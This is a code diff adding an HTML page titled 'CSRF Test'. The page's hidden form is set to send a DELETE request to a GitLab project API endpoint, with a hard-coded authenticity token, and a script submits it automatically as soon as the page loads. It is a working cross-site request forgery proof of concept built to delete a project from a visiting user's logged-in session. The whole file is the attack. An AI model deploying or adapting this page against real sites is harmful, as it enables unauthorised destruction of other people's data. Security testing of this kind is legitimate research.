@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Test</title>
+  </head>
+  <body>
+    <form
+      id="csrf-test-form"
+      action="https://gitlab.com/api/v4/projects/67149693"
+      method="POST"
+      target="hidden_iframe"
+    >
+      <input type="hidden" name="_method" value="DELETE" />
+      <input
+        type="hidden"
+        name="authenticity_token"
+        value="PqDYqBkeVKGONWMzWGk5l2oovedSoI-jDZQIgr_CLdCYcFWGPPnM0r1aENFEXNxdVn5WfAp1T5BhA0YvRKE3EQ"
+      />
+      <!-- Add any other required hidden fields or parameters here -->
+      <button type="submit">Test CSRF</button>
+    </form>
+    <iframe
+      id="hidden-iframe"
+      name="hidden-iframe"
+      style="display: none"
+    ></iframe>
+    <script>
+      document.getElementById("csrf-test-form").submit();
+    </script>
+  </body>
+</html>
